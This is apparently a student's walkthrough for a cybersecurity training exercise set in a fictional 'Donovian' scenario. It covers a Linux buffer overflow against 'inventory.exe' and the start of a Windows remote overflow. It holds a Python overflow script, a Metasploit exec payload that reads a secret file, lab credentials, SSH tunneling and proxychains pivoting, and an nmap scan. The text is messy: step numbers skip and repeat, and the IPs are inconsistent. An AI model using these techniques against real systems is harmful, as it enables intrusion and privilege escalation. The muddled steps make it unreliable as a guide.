### Exploit Development ###

##### ELF Exploit #####

1. Situation: Other teams have extracted this networked binary from a Donovian development network. It is believed to closely related to software running in both the Donovian and Gorgan internal networks. Discover vulnerabilities and create a reliable exploit to gain remote access. This will enable exploitation against Donovian targets and provide the basis for developing mitigations on friendly Gorgan networks. You will be required to exfil a copy from the target to your Op Station.

2. Provided: Executable Package: inventory.exe Task: Perform a local buffer overflow on the vulnerable Linux executable, in order to gain access to the desired intel. Method: Utilize RE toolset and python to launch and develop exploit.

3. ASLR is disabled on the target machine.

4. Exploit this binary found on 192.168.28.111 at /.hidden/inventory.exe to escalate privileges from your pivot user to root.

5. Enter the contents of /.secret/.verysecret.pdb as the flag

Step 1: Download inventory.exe on your local computer and scp to ops-station

Cd /Downlonads Scp inventory.exe student@10.50.40.109: ~ ##saves to hoe dorecrory

Step 2: go to OPs station and change the file settings

![Alt Text](exploit_development_images/image_1.png)

Step 4: run the file in gdb

Gdb ./inventory.exe

Run

![Alt Text](exploit_development_images/image_2.png)

Here, we can see EIP is at EIP: 0x41414141 ('AAAA')

Step 5: Pattern generator

![Alt Text](exploit_development_images/image_3.png)

Copy the string go to gdb --- run ----paste the string as input

Now, EIP changes to EIP: 0x63413563 ('c5Ac')

Find the offset:

![Alt Text](exploit_development_images/image_4.png)

Step 5: Create a python script

Nano elf1.py

#!/user/bin/env python

buffer = "A"*76

eip = "BBBB"

print (buffer + eip)

Save the script

Step 6: run the script on gdb

gdb-peda$ run <<< $(python elf1.py)

![Alt Text](exploit_development_images/image_5.png)

Step 7: run info proc map

![Alt Text](exploit_development_images/image_6.png)

Step 10: go to metasploit.

Pay load stays the same: use payload/linux/x86/exec

set CMD "cat /.secret/.verysecret.pdb" #this is saying hey run this cat command on this file

Copy the buff to python

Step 11: ssh to jumpbox(grey host) Ssh student@10.50.33.231

password

Ssh To T1

Ssh comrade@192.118.28.111 -p 2222

StudentWebExploitPassword

Step 12: verify the file is there and run it

comrade@web:~$ /.hidden/inventory.exe

Step 12: open the new nano file elf1.py

Nano elf1.py

Step 13: run the inventory.exe on lin-ops station

student@lin-ops:~$ env - gdb ./inventory.exe

Show environment

![Alt Text](exploit_development_images/image_7.png)

And run find /b 0xf7de2000,0xf7ffe000,0xff,0xe4

Grab top 3 addreses:

![Alt Text](exploit_development_images/image_8.png)

### Windows Buffer Overflow ###

Situation: Other teams have identified a networked binary from a Donovian development network, a copy is located with the /longTermStorage on the Donovian Webserver. It is common software for the region and is believed to be running in both the Donovian and Gorgan internal networks. Discover vulnerabilities and create a reliable exploit to gain remote access. This will enable remote exploitation against Donovian targets and provide the basis for developing mitigations on friendly Gorgan networks.

Provided: Executable Package: SecureServerind.exe & essfunc.dll Task: Perform a remote buffer overflow on the vulnerable Windows executable from your Linux_analyst box. Gain a shell using exploit code Method: Utilize RE toolset and python to launch and develop exploit.

Launch your remote exploit at the Donovian Windows target on 192.168.150.245 to gain initial access. Your flag is within the public documents .

Scheme of Maneuver:

>internet_grey_host

->T1: 192.168.28.111

->T2: 192.168.28.105

>internet_grey_host

->donovian_grey_host

-->T3: 192.168.150.245

Target Section:

T1

Hostname: Donovian_Webserver

IP: 192.168.28.111

OS: CentOS

Creds: comrade :: StudentWebExploitPassword

Last Known SSH Port: 2222

Action: Exploit binary.

T2

Hostname: Donovian-Terminal

IP: 192.168.28.105

OS: unknown

Creds: comrade :: StudentReconPassword

Last Known SSH Port: 2222

T3

Hostname: unknown

IP: 192.168.150.245

OS: unknown

Creds:unknown

Last Known SSH Port: unknown

PSP: Unknown

Malware: Unknown

Action: Exploit a network service on the machine

-L

Step 1: Create a local Tunnel from lin-ops to Pivot (192.168.28.105) student@lin-ops:~$ ssh student@10.50.33.231 -L 50511:192.168.28.105:2222 -NT

Step 2: Create a Dynamic to Pivot

student@lin-ops:~$ ssh comrade@localhost -p 50511 -D 9050 –NT

Step 3: Scan the target T1 for open ports

student@lin-ops:~$ proxychains nmap -Pn 192.168.28.111 -p 1-5000

Step 4: Create a tunnel from lin-ops to T1

student@lin-ops:~$ ssh comrade@localhost -p 50511 -L 50522:192.168.28.27:22 -NT

Step 5: ssh to T1

student@lin-ops:~$ ssh comrade@localhost -p 50522

Step 6: Go to cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls

![Alt Text](exploit_development_images/image_9.png)

Step 7: Here we are not able to read the files above. But the current user comrade@lin2 has “.” on directory which makes any script we put on that directory executable